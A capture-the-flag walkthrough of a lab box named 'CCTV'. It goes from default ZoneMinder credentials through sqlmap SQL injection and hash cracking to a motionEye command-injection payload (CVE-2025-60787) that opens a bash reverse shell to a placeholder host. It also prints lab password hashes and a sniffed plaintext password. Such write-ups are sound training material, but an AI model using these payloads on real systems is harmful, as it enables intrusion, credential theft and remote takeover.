# CCTV
## Enumeration
### Nmap
Quick nmap scan
```bash
nmap -sV -T4 10.129.3.87
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Web
We see port 80 is hosting a website, so let's check it out.  
There is a button for `Staff login` which redirects us to a `ZoneMinder` interface. We try the default credentials `admin:admin` and we are in.  
Now we check `ZoneMinder` version in the `version` tab and see that it's `1.37.63`.  
Searching google for `zoneminder 1.37.63 exploit` leads us to [this](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)  
## Exploitation
Now we use `BurpSuite` to capture a request to `http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1` and save it locally as `req.txt`.  
```bash
sqlmap -r req.txt --batch -p "tid" --dbs
```
After finding out information about the database we can dump it:
```bash
sqlmap -r req.txt -p "tid" --batch --technique=T --dump -D zm -T Users -C Username,Password
...
Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```
Now let's get cracking.  
`hashcat -m 3200 hashes.txt rockyou.txt`.  
After a couple of minutes we manage to crack the hash of user `mark:opensesame`  
We ssh into the machine `ssh mark@cctv.htb` and upload `linpeas.sh`.  
`Linpeas` tells us about a bunch of bridge interfaces, so let's take a look.  
```bash
tcpdump -i any -nn -A tcp port 5000
...
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
```
Now let's switch to user `sa_mark`.  
`su sa_mark`.  
Now we get user flag.
## ROOT
After logging in as `sa_mark` we find a `'SecureVision Staff Announcement.pdf'` file in the home directory. It says that all staff logins will stay the same.  
Now let's run `netstat -tulnp`. It shows a bunch of different connections and after checking them we see that the one on port `8765` is hosting a `MotionEye` service.  
Let's setup a ssh tunnel and view the website locally:
```bash
ssh -L 8765:127.0.0.1:8765 sa_mark@cctv.htb
sa_mark@cctv.htb's password:
```
Now we can open our browser and go to `localhost:8765` and view the website.  
We can login as `admin:X1l9fx1ZjS7RZb`. We find that the `motionEye` version is `0.43.1b4` and it's vulnerable to `CVE-2025-60787`.  
Executing can be a bit tricky:  
1. First open `localhost:8765` press `F12` and go to console. Then type in `configUiValid = function() { return true; };`
2. Open settings tab on the website and go to `still images`, set `capture mode` to `interval snapshots` and interval time to `10`
3. Paste the payload into `filename` section and press apply
Example payload:
```bash
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```
This will create a `/tmp/test` file on the machine, now let's make it a reverse shell.
`nc -lvnp 4444`  
```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/YOUR-IP/YOUR-PORT 0>&1\"')").%Y-%m-%d-%H-%M-%S
```
After this we get a reverse shell to target machine and we can get the root flag.

